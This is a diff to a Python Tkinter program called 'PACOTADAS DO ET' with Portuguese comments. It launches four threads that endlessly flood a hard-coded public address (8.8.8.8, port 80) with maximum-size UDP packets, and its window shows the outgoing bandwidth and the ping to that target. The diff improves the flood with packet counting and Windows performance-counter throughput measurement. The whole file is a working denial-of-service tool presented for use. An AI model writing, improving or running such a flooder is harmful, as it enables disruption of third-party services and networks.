@@ -1,27 +1,45 @@
 import tkinter as tk
 import threading
-import psutil
 import time
 import subprocess
 import socket
+import sys
 
+import psutil
+import win32pdh
+
+# CONFIGURAÇÕES
 TARGET_IP = "8.8.8.8"
 TARGET_PORT = 80
 BUFFER_SIZE = 65507
 FLOOD_THREADS = 4
+INTERFACE_NAME = "Ethernet"  # exato
+
+# Inicia consulta PDH
+query = win32pdh.OpenQuery()
+counter_path = fr"\Network Interface({INTERFACE_NAME})\Bytes Total/sec"
+counter = win32pdh.AddCounter(query, counter_path)
+win32pdh.CollectQueryData(query)  # amostra inicial
 
 def flood_packets():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = b'A' * BUFFER_SIZE
+    sent_count = 0
     while True:
         try:
             s.sendto(payload, (TARGET_IP, TARGET_PORT))
-        except:
+            sent_count += 1
+            if sent_count % 1000 == 0:
+                print(f"Pacotes enviados: {sent_count}")
+        except Exception as e:
+            print(f"Erro no envio: {e}", file=sys.stderr)
             time.sleep(1)
 
 def get_ping(ip):
     try:
-        result = subprocess.run(["ping", "-n", "1", ip], capture_output=True, text=True)
+        result = subprocess.run(
+            ["ping", "-n", "1", ip], capture_output=True, text=True
+        )
         for line in result.stdout.splitlines():
             if "tempo=" in line or "time=" in line:
                 return line.split("tempo=")[-1].split()[0] if "tempo=" in line else line.split("time=")[-1].split()[0]
@@ -30,29 +48,35 @@ def get_ping(ip):
     return "Timeout"
 
 def update_info():
-    old_sent = psutil.net_io_counters().bytes_sent
     while True:
-        time.sleep(1)
-        new_sent = psutil.net_io_counters().bytes_sent
-        delta_bytes = new_sent - old_sent
-        old_sent = new_sent
-        mbps = (delta_bytes * 8) / 1_000_000
+        # coleta nova amostra e formata
+        win32pdh.CollectQueryData(query)
+        _, val = win32pdh.GetFormattedCounterValue(counter, win32pdh.PDH_FMT_DOUBLE)
+        mbps = val * 8 / 1_000_000  # Bytes/sec -> Megabits/sec
         ping = get_ping(TARGET_IP)
         status_var.set(f"TX: {mbps:.1f} Mbps    Ping: {ping}")
+        time.sleep(1)
 
+# GUI
 root = tk.Tk()
 root.title("PACOTADAS DO ET")
 root.geometry("400x150")
 root.resizable(False, False)
 root.configure(bg="black")
 
-label = tk.Label(root, text="PACOTADAS DO ET", font=("Helvetica", 24, "bold"), fg="lime", bg="black")
-label.pack(pady=20)
+tk.Label(
+    root, text="PACOTADAS DO ET",
+    font=("Helvetica", 24, "bold"),
+    fg="lime", bg="black"
+).pack(pady=20)
 
 status_var = tk.StringVar()
-status_label = tk.Label(root, textvariable=status_var, font=("Consolas", 18), fg="white", bg="black")
-status_label.pack()
+tk.Label(
+    root, textvariable=status_var,
+    font=("Consolas", 18), fg="white", bg="black"
+).pack()
 
+# Threads
 for _ in range(FLOOD_THREADS):
     threading.Thread(target=flood_packets, daemon=True).start()
 
